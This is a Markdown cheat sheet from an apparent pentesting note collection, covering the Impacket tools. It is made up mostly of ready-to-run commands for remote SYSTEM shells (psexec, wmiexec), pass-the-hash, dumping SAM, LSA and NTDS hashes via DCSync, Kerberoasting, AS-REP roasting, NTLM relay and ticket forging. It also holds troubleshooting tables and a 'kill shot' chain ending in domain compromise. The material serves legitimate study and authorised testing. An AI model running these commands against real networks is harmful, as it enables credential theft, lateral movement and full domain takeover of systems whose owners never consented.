# 🐍 Impacket

> A **suite of Python tools** (runs on Kali, talks to Windows over the wire) for SMB/MSRPC/Kerberos. It's how you get code execution, dump hashes, and run Kerberos attacks with a **password, an NT hash, or a ticket** — no cracking needed. On Kali the binaries are prefixed `impacket-` (e.g. `impacket-psexec`).

Part of [[Shells & Payloads]]. Related: [[Pass-the-Hash]] · [[Dumping Windows Hashes]] · [[Kerberoasting]] · [[AS-REP Roasting]] · [[Active Directory]] · [[Mimikatz]]

---

## 🧠 THINK
- Every exec tool takes creds **three ways**: `user:pass`, `-hashes :<NThash>` (PtH), or `-k` (Kerberos ticket).
- Auth string is always `DOMAIN/user:pass@target` (drop `DOMAIN/` for local; add `--local-auth`-style via secretsdump's `LOCAL`).
- **psexec = loud + SYSTEM** (drops a service). **wmiexec/smbexec/atexec = quieter**, no new service.
- Needs **local admin** on the target for the exec tools; the roasting/enum tools need only a domain user.
- Never crack what you can pass — feed hashes straight in with `-hashes`.

## 💥 CODE EXECUTION (need admin on target)
```bash
impacket-psexec DOMAIN/user:'pass'@$IP            # SYSTEM shell, noisy (service)
```
```bash
impacket-wmiexec DOMAIN/user:'pass'@$IP           # semi-interactive, quiet
```
```bash
impacket-smbexec DOMAIN/user:'pass'@$IP           # quiet, service-based
```
```bash
impacket-atexec DOMAIN/user:'pass'@$IP whoami     # via Task Scheduler
```
Pass-the-hash instead of a password (any of the above):
```bash
impacket-psexec -hashes :<NThash> DOMAIN/user@$IP
```

## 💥 DUMP HASHES (secretsdump)
```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL   # offline hives
```
```bash
impacket-secretsdump DOMAIN/user:'pass'@$IP                    # remote SAM+LSA
```
```bash
impacket-secretsdump -just-dc DOMAIN/user:'pass'@<DC_IP>       # NTDS (DCSync)
```
→ full workflow in [[Dumping Windows Hashes]].

## 💥 KERBEROS ATTACKS
Kerberoast (SPN accounts → crackable TGS):
```bash
impacket-GetUserSPNs -request DOMAIN/user:'pass' -dc-ip <DC_IP>
```
AS-REP roast (users with pre-auth disabled):
```bash
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip <DC_IP> -no-pass
```
Use a ticket you already have (pass-the-ticket):
```bash
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass DOMAIN/user@target.corp.local
```
→ cracking side: [[Kerberoasting]] · [[AS-REP Roasting]].

## 💥 OTHER HANDY TOOLS
```bash
impacket-mssqlclient DOMAIN/user:'pass'@$IP -windows-auth      # MSSQL → xp_cmdshell ([[MSSQL]])
```
```bash
impacket-smbserver share . -smb2support                       # host a share for file transfer ([[File Transfer]])
```
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support              # NTLM relay
```
```bash
impacket-ticketer / impacket-getST                            # forge / request tickets (golden/silver, S4U)
```

## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| psexec/wmiexec SYSTEM shell | dump hashes ([[Dumping Windows Hashes]]) → PtH ([[Pass-the-Hash]]) |
| secretsdump NT hashes | pass/reuse everywhere ([[Credential Reuse]]) |
| `-just-dc` NTDS dumped | domain compromise ([[Active Directory]]) |
| TGS from GetUserSPNs | crack → SPN account creds ([[Kerberoasting]]) |
| AS-REP hash | crack → user creds ([[AS-REP Roasting]]) |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| `STATUS_ACCESS_DENIED` on exec | user isn't local admin — try another host/cred; enum first |
| psexec fails but SMB valid | switch to wmiexec/smbexec/atexec (no service) |
| auth fails | check `DOMAIN/` vs local, quote the password, clock skew for `-k` → [[Credentials Rejected]] |
| Kerberos `KRB_AP_ERR_SKEW` | sync clock: `ntpdate <DC_IP>` / `faketime` |
| hostname vs IP for `-k` | Kerberos needs the **FQDN**, not the IP — fix `/etc/hosts` |

## 📇 CHEAT SHEET
```bash
impacket-psexec DOMAIN/user:'pass'@$IP                      # SYSTEM (loud)
impacket-wmiexec -hashes :<NThash> DOMAIN/user@$IP          # quiet + PtH
impacket-secretsdump DOMAIN/user:'pass'@$IP                 # dump hashes ; -just-dc on DC
impacket-GetUserSPNs -request DOMAIN/user:'pass' -dc-ip <DC_IP>   # kerberoast
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip <DC_IP>  # asrep
```
**Kill shot:** admin cred/hash → `impacket-psexec`/`wmiexec` SYSTEM → `impacket-secretsdump` → PtH + reuse → lateral / domain ([[Active Directory]]).
